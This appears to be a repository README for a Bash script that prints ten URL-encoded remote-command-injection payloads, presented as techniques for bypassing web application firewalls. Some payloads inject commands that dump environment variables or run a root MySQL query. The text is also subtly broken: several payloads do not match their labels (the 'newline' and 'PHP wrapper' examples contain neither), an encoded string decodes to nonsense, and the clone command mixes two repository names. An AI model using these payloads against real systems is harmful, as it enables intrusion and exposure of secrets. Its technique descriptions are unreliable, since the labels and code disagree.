# RCE Payloads for WAF Bypass

This repository contains a Bash script with example payloads designed to demonstrate various techniques for bypassing Web Application Firewalls (WAFs) in the context of Remote Code Execution (RCE) vulnerabilities. The provided payloads are for educational and research purposes only.

## Overview

Web Application Firewalls (WAFs) are commonly used to protect web applications from various types of attacks, including Remote Code Execution (RCE). However, attackers often attempt to bypass these protections using various techniques. This repository provides a Bash script with a collection of example payloads that might be employed to bypass WAFs.

## Script

The `rce_payloads.sh` script contains ten example payloads. Each payload demonstrates a different technique for attempting to exploit RCE vulnerabilities while trying to avoid detection by WAFs.

### Example Payloads

1. **Basic Command Injection with URL Encoding**
2. **Double URL Encoding**
3. **Base64 Encoding**
4. **Unix Time-Based Payload**
5. **Nested Encodings**
6. **Using Environment Variables**
7. **Bypassing WAF with Delimiters**
8. **Payload with SQL Injection**
9. **Using PHP Wrappers**
10. **Bypassing WAF with Newline Characters**

### Script Content

The script is designed to output various payloads that can be used in testing. Each payload is constructed to demonstrate different evasion techniques.

```bash
#!/bin/bash

# Example payloads for RCE with WAF bypass techniques

# 1. Basic Command Injection with URL Encoding
payload1="http://example.com/vulnerable?param=cmd%3D%28%27id%27%29"
echo "Payload 1: $payload1"

# 2. Double URL Encoding
payload2="http://example.com/vulnerable?param=cmd%253D%2528%2527id%2527%2529"
echo "Payload 2: $payload2"

# 3. Base64 Encoding
payload3="http://example.com/vulnerable?param=cmd%3D%28%27echo%20%24%28echo%20c3NoIGNoYW5nZQ%29%27%29"
echo "Payload 3: $payload3"

# 4. Unix Time-Based Payload
payload4="http://example.com/vulnerable?param=cmd%3D%28%27date%20%26%26%20id%27%29"
echo "Payload 4: $payload4"

# 5. Nested Encodings
payload5="http://example.com/vulnerable?param=cmd%253D%2528%2527echo%2520%2524%2528echo%2520c3NoIGNoYW5nZQ%2529%2527%2529"
echo "Payload 5: $payload5"

# 6. Using Environment Variables
payload6="http://example.com/vulnerable?param=cmd%3D%28%27%24%28env%29%27%29"
echo "Payload 6: $payload6"

# 7. Bypassing WAF with Delimiters
payload7="http://example.com/vulnerable?param=cmd%3D%28%27%24%28command%20%24%28echo%20%24%28echo%20id%29%29%29%27%29"
echo "Payload 7: $payload7"

# 8. Payload with SQL Injection
payload8="http://example.com/vulnerable?param=cmd%3D%28%27%24%28mysql%20-U%20root%20-e%20%27SELECT%20user()%27%29%27%29"
echo "Payload 8: $payload8"

# 9. Using PHP Wrappers
payload9="http://example.com/vulnerable?param=cmd%3D%28%27php%20%27%29%27"
echo "Payload 9: $payload9"

# 10. Bypassing WAF with Newline Characters
payload10="http://example.com/vulnerable?param=cmd%3D%28%27%24%28echo%20%22id%22%29%27%29"
echo "Payload 10: $payload10"

# End of Payloads
echo "Payloads listed above can be used for testing purposes. Ensure proper authorization before testing."
```

## Usage

1. **Clone the repository**:

   ```bash
   git clone [https://github.com/soheil-vanaee/rce-waf-bypass.git](https://github.com/soheil-vanaee/rce-payload-bypassing-WAF-.git)
   cd rce-waf-bypass
   ```

2. **Make the script executable**:

   ```bash
   chmod +x rce_payloads.sh
   ```

3. **Run the script**:

   ```bash
   ./rce_payloads.sh
   ```

   This will print out the payloads to the terminal.

## Important Notes

- **Authorization**: Ensure that you have explicit permission before testing any payloads on systems. Unauthorized testing is illegal and unethical.
- **Adjustments**: Payloads may need modification based on the specific WAF and application you are targeting.
- **Ethical Use**: Use these techniques responsibly and only in controlled, authorized environments.
